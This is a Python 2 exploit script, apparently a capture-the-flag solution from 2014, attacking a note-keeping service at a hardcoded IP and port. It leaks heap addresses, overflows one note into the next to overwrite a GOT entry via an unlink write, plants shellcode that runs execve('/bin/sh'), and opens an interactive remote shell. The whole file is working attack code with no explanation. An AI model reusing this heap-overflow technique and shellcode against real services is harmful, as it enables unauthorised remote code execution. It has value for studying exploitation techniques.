#!/usr/bin/env python
# -*- coding: UTF-8 -*-
'''
Exploit the heap overflow vulnerability 
Created on 2014/12/10
@author: Ben Chang
'''
import socket
import struct
#information of host
host='218.2.197.235'
port=10103
#socket connection
soc=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
soc.connect((host,port))
#self-defined methods
def recvuntil(str):
    global soc
    rec_str=soc.recv(1024)
    while str not in rec_str:
        rec_str+=soc.recv(1024)
    return rec_str
def getshell():
    global soc
    while True:
        cmd=raw_input('$')
        soc.send(cmd+'\n')
        print soc.recv(1024)
#address info
got_write_addr=0x0804a478-0x8
#shellcode
shellcode="\x90"*8+"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" #shelcode to execute excve("/bin/sh",null,null)
#payload
payload="a"*0x100+"a"*4
#first new three node,store the shellcode in node3
#node1
print recvuntil("option--->>")
soc.send("1\n")
print recvuntil("note title:")
soc.send("node1\n")
print recvuntil("note type:")
soc.send("node1\n")
print recvuntil("note content:")
soc.send("node1\n")
#node2
print recvuntil("option--->>")
soc.send("1\n")
print recvuntil("note title:")
soc.send("node2\n")
print recvuntil("note type:")
soc.send("node2\n")
print recvuntil("note content:")
soc.send("node2\n")
#node3
print recvuntil("option--->>")
soc.send("1\n")
print recvuntil("note title:")
soc.send("node3\n")
print recvuntil("note type:")
soc.send("node3\n")
print recvuntil("note content:")
soc.send(shellcode+"\n")
print "already new three node\n"
#then get the address of node2 and node3
print recvuntil("option--->>")
soc.send("3\n")
print recvuntil("note title:")
soc.send("node2\n")
data=recvuntil("option--->>")
temp_index=data.index("0x")
node2_addr=data[temp_index+2:temp_index+10]
print "node2 location:%s\n"%node2_addr
print data
soc.send("3\n")
print recvuntil("note title:")
soc.send("node3\n")
data=recvuntil("option--->>")
temp_index=data.index("0x")
node3_addr=data[temp_index+2:temp_index+10]
print "node3 location:%s\n"%node3_addr
print data
node3_addr=int(node3_addr,16)
shellcode_addr=node3_addr+108
#complete the payload
payload+=struct.pack('I',int(node2_addr,16))
payload+=struct.pack('I',got_write_addr)
payload+=struct.pack('I',shellcode_addr)
#edit node1 to overflow node2
soc.send("4\n")
print recvuntil("note title:")
soc.send("node1\n")
print recvuntil("input content:")
soc.send(payload+"\n")
#delete node2 to trigger dword shoot
print recvuntil("option--->>")
soc.send("5")
print recvuntil("note location:")
soc.send(node2_addr+"\n")
#print soc.recv(1024)
getshell()
